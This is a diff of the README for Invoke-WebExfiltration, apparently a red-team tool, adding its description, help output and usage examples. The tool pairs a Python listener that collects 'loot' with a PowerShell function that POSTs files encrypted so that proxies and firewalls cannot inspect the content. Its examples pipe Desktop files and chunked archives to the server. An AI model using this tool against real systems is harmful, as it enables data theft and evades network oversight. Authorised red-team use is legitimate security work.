@@ -1,13 +1,21 @@
 # Invoke-WebExfiltration
 Exfiltrate data via PowerShell HTTP(s) POST request (with file gzip compression and AES-256 encryption)
 
-Exfiltrate files to a remote server in a secure, encrypted way
-
 
 # Description
+Invoke-WebExfiltration is a convince tools which makes exfiltrating via PowerShell to a remote server quite a bit easier during Red Team assessments. 
+Data is transferred via HTTP(S) POST requests, with a JSON body containing the information.
+All data is AES-256 encrypted which makes file exfiltration even via HTTP secure. 
+Furthermore, even with TLS stripping the firewall / proxy can't see want data is being transferred. 
+
+Files can also be exfiltrated through a web proxy (with none, NTLM, Kerberos or Basic Authentication)
 
 # Features
-
+- Proxy support: none, NTLM, Kerberos or Basic Authentication
+- Easy to use
+- Strong AES-256 encryption
+- Gzip compression
+- 
 
 
 # Technical details / design thoughts
@@ -38,17 +46,82 @@ Exfiltrate files to a remote server in a secure, encrypted way
 
 # ToDo:
 - I'm unhappy with the way SSL/HTTPS is done. Needs improvement
-- 
+- Add some sort of file upload restriction (Basic Auth?)
 
 
 # Limitations
 - Large files (100MB) should be split into chunks and then exfiltrated (see examples)
 
 # Help
+
+## iwe-server.py
 ```bash
-...
+$ ./iwe-server.py --help
+ _____  ____      ____  ________
+|_   _||_  _|    |_  _||_   __  |
+  | |    \ \  /\  / /    | |_ \_|
+  | |     \ \/  \/ /     |  _| _
+ _| |_     \  /\  /     _| |__/ |
+|_____|     \/  \/     |________|
+
+Invoke-WebExfiltration v0.2
+by Philipp Rieth
+
+usage: iwe-server.py [-h] [-a ADDRESS] [-p PORT] [-P PASSWORD] [-t TARGETDIR] [--crt CRT] [--key KEY] [--http] [--verbose]
+
+Exfiltrate files to a remote server in a secure, encrypted way
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -a ADDRESS, --address ADDRESS
+                        The domain, hostname or IP address that will be embedded into the PowerShell script.
+                        Default: local IP address
+  -p PORT, --port PORT  Listening port that will be used.
+                        Default: 8000
+  -P PASSWORD, --password PASSWORD
+                        Password to use for decryption.
+                        Default: generate random password
+  -t TARGETDIR, --targetdir TARGETDIR
+                        Loot directory to store the exfiltrated files in.
+                        Default: '/home/phil/git/Invoke-WebExfiltration/loot/'
+  --crt CRT             Path to custom certificate (.crt)
+  --key KEY             Path to custom certificate private key (.key)
+  --http                Use HTTP instead of HTTPS.
+                        Default: HTTPS
+  --verbose             Print verbose information on console.
+                        Default: False
 ```
 
+## Invoke-WebExfiltration.ps1
+```powershell
+PS > Get-Help Invoke-WebExfiltration
+
+NAME
+    Invoke-WebExfiltration
+
+SYNOPSIS
+    PowerShell function to exfiltrate data via HTTP(s) POST request
+    (with file gzip compression and AES-256 encryption)
+    Author: Philipp Rieth
+
+
+SYNTAX
+    Invoke-WebExfiltration [-File] <Object> [[-Target] <String>] [-Password <String>] [-Insecure] [<CommonParameters>]
+
+
+DESCRIPTION
+
+
+RELATED LINKS
+    GitHub: https://github.com/PhilippRieth/Invoke-WebExfiltration
+    GitHub: https://github.com/PhilippRieth/Invoke-WebExfiltration
+
+REMARKS
+    To see the examples, type: "Get-Help Invoke-WebExfiltration -Examples"
+    For more information, type: "Get-Help Invoke-WebExfiltration -Detailed"
+    For technical information, type: "Get-Help Invoke-WebExfiltration -Full"
+    For online help, type: "Get-Help Invoke-WebExfiltration -Online"
+```
 
 # Installation
 
@@ -75,12 +148,6 @@ pip install -r requirements.txt
 ```
 
 # Usage & Examples
-
-```bash
-
-
-```
-
 
 ## Load `IWE` into PowerShell 
 
@@ -155,7 +222,19 @@ ls $HOME/Desktop | IWE
 
 ## Exfiltrate large files (split into chunks)
 Large files (>100MB) should be split into smaller chunks.
-```powershell
-tba.
-```
+- [Split-File.ps1](https://www.powershellgallery.com/packages/FileSplitter/1.3/Content/Split-File.ps1)
+- [Join-File.ps1](https://www.powershellgallery.com/packages/FileSplitter/1.3/Content/Join-File.ps1)
 
+```powershell
+# Window client side
+PS > Import-Module .\Split-File.ps1
+PS > Split-File -Path .\large.zip -PartSizeBytes 50MB
+PS > ls large.zip.* | IWE
+
+# Linux server side, install PowerShell on Linux
+$ sudo apt update
+$ sudo apt install powershell
+$ powershell
+PS > Import-Module .\Join-File.ps1
+PS > Join-File -Path "C:\large.zip"
+```
